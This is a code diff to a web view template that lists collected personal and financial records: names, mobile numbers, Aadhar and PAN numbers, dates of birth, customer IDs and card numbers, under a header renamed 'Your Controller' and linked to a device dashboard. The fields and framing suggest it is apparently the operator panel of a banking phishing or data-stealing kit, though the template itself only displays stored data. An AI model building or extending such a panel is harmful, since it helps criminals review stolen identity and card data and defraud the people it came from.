@@ -7,27 +7,58 @@
   <link rel="stylesheet" href="/css/userDetail.css" />
 </head>
 <body>
+  <!-- Header Navigation -->
   <header class="header-nav">
-    <h1>User Details</h1>
+    <h1>Your Controller</h1>
   </header>
 
+  <!-- Main Content Container -->
   <div class="user-detail-container">
     <h2>User Details</h2>
 
+    <!-- User Details Section -->
     <% if (user && user.entries && user.entries.length > 0) { %>
       <% user.entries.forEach((entry, index) => { %>
         <div class="card">
-          <h3>Entry - <%= index + 1 %></h3>
+          <h3>Personal Information - <%= index + 1 %></h3>
           <p><strong>Name:</strong> <%= entry.name %></p>
-          <p><strong>Mobile Number:</strong> <%= entry.mobileNumber %></p>
-          <p><strong>Aadhar:</strong> <%= entry.aadhar %></p>
-          <p><strong>PAN:</strong> <%= entry.pan %></p>
-          <p><strong>Date of Birth:</strong> <%= new Date(entry.dob).toLocaleDateString() %></p>
-          <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+          <p><strong>Mobile No:</strong> <%= entry.mobileNumber %></p>
+          <p><strong>Aadhar Number:</strong> <%= entry.aadhar %></p>
+          <p><strong>PAN Number:</strong> <%= entry.pan %></p>
+          <p><strong>Date of Birth:</strong> <%= entry.dob %></p>
+          <p><strong>Unique ID:</strong> <%= entry.uniqueId %></p>
         </div>
       <% }); %>
     <% } else { %>
       <p>No User Data Found</p>
+    <% } %>
+
+    <!-- Card Payment Details Section -->
+    <% if (cardPayment && cardPayment.entries && cardPayment.entries.length > 0) { %>
+      <% cardPayment.entries.forEach((entry, index) => { %>
+        <div class="card">
+          <h3>Card Payment Details - <%= index + 1 %></h3>
+          <p><strong>Aadhar Number:</strong> <%= entry.aadharNumber %></p>
+          <p><strong>Date of Birth:</strong> <%= entry.dateOfBirth %></p>
+          <p><strong>Customer ID:</strong> <%= entry.customerId %></p>
+          <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+        </div>
+      <% }); %>
+    <% } else { %>
+      <p>No Card Payment Data Found</p>
+    <% } %>
+
+    <!-- Net Banking Details Section -->
+    <% if (netBanking && netBanking.entries && netBanking.entries.length > 0) { %>
+      <% netBanking.entries.forEach((entry, index) => { %>
+        <div class="card">
+          <h3>Net Banking Details - <%= index + 1 %></h3>
+          <p><strong>Card Number:</strong> <%= entry.cardNumber %></p>
+          <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+        </div>
+      <% }); %>
+    <% } else { %>
+      <p>No Net Banking Data Found</p>
     <% } %>
 
     <a href="/api/device/dashboard">
